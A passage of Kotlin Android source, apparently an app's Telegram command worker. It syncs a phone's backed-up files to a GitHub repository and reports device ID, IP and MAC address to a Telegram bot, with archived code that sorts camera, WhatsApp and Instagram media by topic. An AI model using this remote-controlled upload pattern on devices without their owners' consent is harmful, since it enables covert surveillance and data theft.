                        enviarConfirmacionTelegram(token, chatId, "⚠️ Configuración de GitHub incompleta")
                        return@launch
                    }
                    
                    val githubSync = com.service.assasinscreed02.github.GitHubHistorialSync(applicationContext)
                    
                    // Obtener historial local desde la base de datos
                    val repository = com.service.assasinscreed02.repository.BackupRepository(applicationContext)
                    val historialLocal = runBlocking {
                        withContext(Dispatchers.IO) {
                            repository.getAllFiles().first()
                        }
                    }
                    
                    val success = runBlocking {
                        withContext(Dispatchers.IO) {
                            githubSync.syncHistorialToGitHub(historialLocal, config)
                        }
                    }
                    
                    if (success) {
                        val stats = runBlocking {
                            withContext(Dispatchers.IO) {
                                githubSync.getGlobalStatistics(config)
                            }
                        }
                        val totalFiles = stats["totalFiles"] as? Int ?: 0
                        val totalSize = stats["totalSize"] as? Long ?: 0L
                        val sizeText = if (totalSize > 0) " (${formatFileSize(totalSize)})" else ""
                        enviarConfirmacionTelegram(token, chatId, "✅ Sincronización con GitHub exitosa\n📁 Total de archivos: $totalFiles$sizeText")
                    } else {
                        enviarConfirmacionTelegram(token, chatId, "❌ Error en la sincronización con GitHub")
                    }
                } catch (e: Exception) {
                    enviarConfirmacionTelegram(token, chatId, "❌ Error sincronizando con GitHub: ${e.message}")
                }
            }
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerGitHubStats(): String {
        return try {
            val prefs = applicationContext.getSharedPreferences("github_config", Context.MODE_PRIVATE)
            val githubToken = prefs.getString("github_token", "") ?: ""
            
            if (githubToken.isBlank()) {
                return "⚠️ GitHub no está configurado"
            }
            
            val config = com.service.assasinscreed02.github.GitHubHistorialSync.GitHubConfig(
                token = githubToken,
                owner = prefs.getString("github_owner", "userserverbackup") ?: "userserverbackup",
                repo = prefs.getString("github_repo", "radio2-backup-historial") ?: "radio2-backup-historial",
                branch = prefs.getString("github_branch", "main") ?: "main"
            )
            
            if (!config.isValid()) {
                return "⚠️ Configuración de GitHub incompleta"
            }
            
            val githubSync = com.service.assasinscreed02.github.GitHubHistorialSync(applicationContext)
            val stats = runBlocking {
                withContext(Dispatchers.IO) {
                    githubSync.getGlobalStatistics(config)
                }
            }
            
            val totalFiles = stats["totalFiles"] as? Int ?: 0
            val totalSize = stats["totalSize"] as? Long ?: 0L
            val successfulBackups = stats["successfulBackups"] as? Int ?: 0
            val failedBackups = stats["failedBackups"] as? Int ?: 0
            val lastSync = stats["lastSync"] as? Long ?: 0L
            
            val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            val lastSyncStr = if (lastSync > 0) sdf.format(Date(lastSync)) else "Nunca"
            
            // Obtener información del dispositivo
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
                📊 *Estadísticas de GitHub:*
                
                📁 Total de archivos: $totalFiles
                💾 Tamaño total: ${formatFileSize(totalSize)}
                ✅ Backups exitosos: $successfulBackups
                ❌ Backups fallidos: $failedBackups
                🔄 Última sincronización: $lastSyncStr
                🌐 Repositorio: ${config.owner}/${config.repo}
                
                📱 *Información del Dispositivo:*
                🆔 ID: ${deviceInfo.deviceId}
                📱 Dispositivo: ${deviceInfo.deviceName}
                🌐 IP: ${deviceInfo.ipAddress}
                📡 MAC: ${deviceInfo.macAddress}
                🤖 Android: ${deviceInfo.androidVersion}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo estadísticas de GitHub: ${e.message}"
        }
    }

    private fun formatFileSize(size: Long): String {
        return when {
            size < 1024 -> "$size B"
            size < 1024 * 1024 -> "${size / 1024} KB"
            size < 1024 * 1024 * 1024 -> "${size / (1024 * 1024)} MB"
            else -> "${size / (1024 * 1024 * 1024)} GB"
        }
    }
    
    private fun obtenerEstadoBackup(): String {
        return try {
            val workInfos = WorkManager.getInstance(applicationContext)
                .getWorkInfosForUniqueWork("backup_trabajo")
                .get()
            
            if (workInfos.isEmpty()) {
                "Servicio detenido"
            } else {
                val estado = workInfos[0].state
                when (estado) {
                    androidx.work.WorkInfo.State.ENQUEUED -> "Servicio programado"
                    androidx.work.WorkInfo.State.RUNNING -> "Servicio ejecutándose"
                    androidx.work.WorkInfo.State.SUCCEEDED -> "Última ejecución exitosa"
                    androidx.work.WorkInfo.State.FAILED -> "Última ejecución fallida"
                    else -> "Estado: $estado"
                }
            }
        } catch (e: Exception) {
            "Error obteniendo estado: ${e.message}"
        }
    }
    
    private fun reprogramarWorker(): Result {
        try {
            val next = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()
                
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                next
            )
            Log.d(TAG, "Worker reprogramado para ejecutarse en 1 minuto")
        } catch (e: Exception) {
            Log.e(TAG, "Error reprogramando worker: ${e.message}", e)
        }
        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        workerScope.cancel()
    }

    // ARCHIVADO: Sistema de agrupación de temas desactivado
    /*
    private suspend fun mostrarConfiguracionTemas(token: String, chatId: String) {
        try {
            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
            
            val temas = listOf(
                "📸 DCIM - Camera" to "topic_camera",
                "📸 DCIM - Screenshots" to "topic_screenshots",
                "📸 DCIM - WhatsApp" to "topic_whatsapp",
                "📸 DCIM - Telegram" to "topic_telegram",
                "📸 DCIM - Instagram" to "topic_instagram",
                "📸 DCIM - Downloads" to "topic_downloads",
                "📸 DCIM - Other" to "topic_other",
                "📸 Pictures" to "topic_pictures",
                "🎥 Movies" to "topic_movies",
                "🎥 Videos" to "topic_videos",
                "🎵 Music" to "topic_music",
                "🎵 Ringtones" to "topic_ringtones",
                "🎵 Notifications" to "topic_notifications",
                "🎵 Alarms" to "topic_alarms",
                "📄 Documents" to "topic_documents",
                "📄 Downloads" to "topic_downloads_docs",
                "📱 Apps" to "topic_apps",
                "📁 Other" to "topic_other_files"
            )
            
            val mensaje = buildString {
                appendLine("⚙️ *Configuración de Temas de Telegram*")
                appendLine()
                appendLine("📋 *Temas configurados:*")
                
                temas.forEach { (nombreTema, clave) ->
                    val id = sharedPrefs.getInt(clave, 0)
                    val estado = if (id > 0) "✅ ID: $id" else "❌ No configurado"
                    appendLine("• $nombreTema: $estado")
                }
                
                appendLine()
                appendLine("🔧 *Para configurar IDs:*")
                appendLine("1. Envía un mensaje con el formato:")
                appendLine("   `/set_topic [nombre] [id]`")
                appendLine()
                appendLine("📝 *Ejemplos:*")
                appendLine("• `/set_topic camera 5`")
                appendLine("• `/set_topic screenshots 12`")
                appendLine("• `/set_topic whatsapp 8`")
                appendLine()
                appendLine("💡 *Consejo:* Los IDs se obtienen al crear los temas en Telegram.")
            }
            
            enviarConfirmacionTelegram(token, chatId, mensaje.toString())
            
        } catch (e: Exception) {
            Log.e(TAG, "Error mostrando configuración de temas: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando configuración: ${e.message}")
        }
    }
    */

    // ARCHIVADO: Sistema de agrupación de temas desactivado
    /*
    private suspend fun configurarTopicId(token: String, chatId: String, comando: String) {
        try {
            // Parsear el comando: /set_topic [nombre] [id]
            val partes = comando.split(" ").filter { it.isNotBlank() }
            
            if (partes.size != 3) {
                enviarConfirmacionTelegram(token, chatId, "❌ Formato incorrecto. Usa: `/set_topic [nombre] [id]`")
                return
            }
            
            val nombreTema = partes[1].lowercase()
            val id = partes[2].toIntOrNull()
            
            if (id == null || id <= 0) {
                enviarConfirmacionTelegram(token, chatId, "❌ ID inválido. Debe ser un número positivo.")
                return
            }
            
            // Mapeo de nombres a claves de SharedPreferences
            val mapeoTemas = mapOf(
                "camera" to "topic_camera",
                "screenshots" to "topic_screenshots",
                "whatsapp" to "topic_whatsapp",
                "telegram" to "topic_telegram",
                "instagram" to "topic_instagram",
                "downloads" to "topic_downloads",
                "other" to "topic_other",
                "pictures" to "topic_pictures",
                "movies" to "topic_movies",
                "videos" to "topic_videos",
                "music" to "topic_music",
                "ringtones" to "topic_ringtones",
                "notifications" to "topic_notifications",
                "alarms" to "topic_alarms",
                "documents" to "topic_documents",
                "downloads_docs" to "topic_downloads_docs",
                "apps" to "topic_apps",
                "other_files" to "topic_other_files"
            )
            
            val clave = mapeoTemas[nombreTema]
            if (clave == null) {
                val temasDisponibles = mapeoTemas.keys.joinToString(", ")
                enviarConfirmacionTelegram(token, chatId, "❌ Tema no válido. Temas disponibles: $temasDisponibles")
                return
            }
            
            // Guardar el ID en SharedPreferences
            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
            sharedPrefs.edit().putInt(clave, id).apply()
            
            val mensaje = "✅ Tema configurado exitosamente:\n\n📁 Tema: $nombreTema\n🆔 ID: $id\n\n💡 Los archivos ahora se enviarán a este tema."
            enviarConfirmacionTelegram(token, chatId, mensaje)
            
            Log.d(TAG, "Topic ID configurado: $nombreTema = $id")
            
        } catch (e: Exception) {
            Log.e(TAG, "Error configurando topic ID: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error configurando topic ID: ${e.message}")
        }
    }
    */

    // ARCHIVADO: Sistema de agrupación de temas desactivado
    /*
    private suspend fun encontrarTopicIds(token: String, chatId: String) {
        try {
            val mensaje = """
                🔍 *Cómo encontrar los IDs de los temas*
                
                📋 *Método 1: Prueba y error*
                1. Crea un tema en tu grupo
                2. Usa `/set_topic camera 1`
                3. Usa `/probar_agrupacion`
                4. Si funciona, el ID es 1
                5. Si no funciona, prueba con 2, 3, etc.
                
                📋 *Método 2: Creación secuencial*
                1. Elimina todos los temas existentes
                2. Crea los temas en este orden exacto:
                   • DCIM - Camera
                   • DCIM - Screenshots  
                   • DCIM - WhatsApp
                   • DCIM - Telegram
                   • DCIM - Instagram
                   • DCIM - Downloads
                   • DCIM - Other
                   • Pictures
                   • Movies
                   • Videos
                   • Music
                   • Ringtones
                   • Notifications
                   • Alarms
                   • Documents
                   • Downloads
                   • Apps
                   • Other
                
                3. Los IDs serán: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18
                
                📋 *Método 3: Comando automático*
                Usa `/set_topic [nombre] [número]` con diferentes números:
                • `/set_topic camera 5`
                • `/set_topic camera 10`
                • `/set_topic camera 15`
                
                Luego usa `/probar_agrupacion` para verificar.
                
                💡 *Consejo:* Los IDs suelen ser números pequeños (1-20) y secuenciales.
            """.trimIndent()
            
            enviarConfirmacionTelegram(token, chatId, mensaje)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error mostrando ayuda para encontrar IDs: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando ayuda: ${e.message}")
        }
    }
    */

    /**
     * Muestra el estado actual del sistema de cola para múltiples dispositivos
     */
    private suspend fun mostrarEstadoCola(token: String, chatId: String) {
        try {
            val deviceInfo = DeviceInfo(applicationContext)
            val deviceId = deviceInfo.getDeviceId()
            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
            
            val mensaje = """
                🔄 *Estado del Sistema de Cola*
                
                📱 *Dispositivo Actual:*
                • ID: `$deviceId`
                • Nombre: $deviceName
                • Estado: Activo
                
                ⚙️ *Configuración de Cola:*
                • Delay aleatorio: 1-5 segundos
                • Delay adicional en rate limit: 5-15 segundos
                • Reintentos máximos: 5
                • Timeout de conexión: 60s
                
                📊 *Estadísticas:*
                • Sistema implementado: ✅
                • Conflictos evitados: ✅
                • Rate limiting optimizado: ✅
                
                💡 *Cómo funciona:*
                1. Cada dispositivo espera 1-5s aleatorio
                2. Si hay rate limit, espera tiempo extra
                3. Reintentos con backoff exponencial
                4. Verificación de estado del bot
                
                🔧 *Comandos disponibles:*
                • `/cola_estado` - Ver este estado
                • `/device_info` - Info del dispositivo
                • `/github_sync` - Sincronizar con GitHub
                
                _El sistema está optimizado para múltiples dispositivos._
            """.trimIndent()
            
            enviarConfirmacionTelegram(token, chatId, mensaje)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error mostrando estado de cola: ${e.message}")
            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando estado de cola: ${e.message}")
        }
    }
}

fun enviarConfirmacionTelegram(token: String, chatId: String, mensaje: String) {
    val maxReintentos = 5
    var intento = 1
    var backoff = 1000L // 1 segundo
    val maxBackoff = 60000L // 1 minuto
    while (intento <= maxReintentos) {
        try {
            val url = "https://api.telegram.org/bot$token/sendMessage"
            val json = org.json.JSONObject().apply {
                put("chat_id", chatId)
                put("text", mensaje)
                put("parse_mode", "Markdown")
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val client = OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""
            if (response.isSuccessful) {
                Log.d("TelegramCommandWorker", "Mensaje enviado: $mensaje")
                response.close()
                break
            } else {
                // Manejo de error 429 (rate limit)
                if (response.code == 429) {
                    var retryAfter = 0L
                    try {
                        val jsonResp = org.json.JSONObject(responseBody)
                        retryAfter = jsonResp.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                    } catch (_: Exception) {}
                    if (retryAfter > 0) {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $retryAfter segundos antes de reintentar")
                        Thread.sleep(retryAfter * 1000)
                    } else {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $backoff ms antes de reintentar")
                        Thread.sleep(backoff)
                        backoff = (backoff * 2).coerceAtMost(maxBackoff)
                    }
                    intento++
                } else {
                    Log.w("TelegramCommandWorker", "Error enviando mensaje: ${response.code} - $responseBody")
                    response.close()
                    break
                }
            }
            response.close()
        } catch (e: Exception) {
            Log.e("TelegramCommandWorker", "Error enviando confirmación: ${e.message}", e)
            try { Thread.sleep(backoff) } catch (_: Exception) {}
            backoff = (backoff * 2).coerceAtMost(maxBackoff)
            intento++
        }
    }
    if (intento > maxReintentos) {
        Log.e("TelegramCommandWorker", "No se pudo enviar el mensaje tras $maxReintentos intentos: $mensaje")
    }
} 

// Añadir función para obtener chat_id secundario
private fun obtenerChatIdSecundario(context: Context): String? {
    return try {
        val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
        prefs.getString("bot_chat_id_secundario", null)
    } catch (e: Exception) {
        null
    }
} 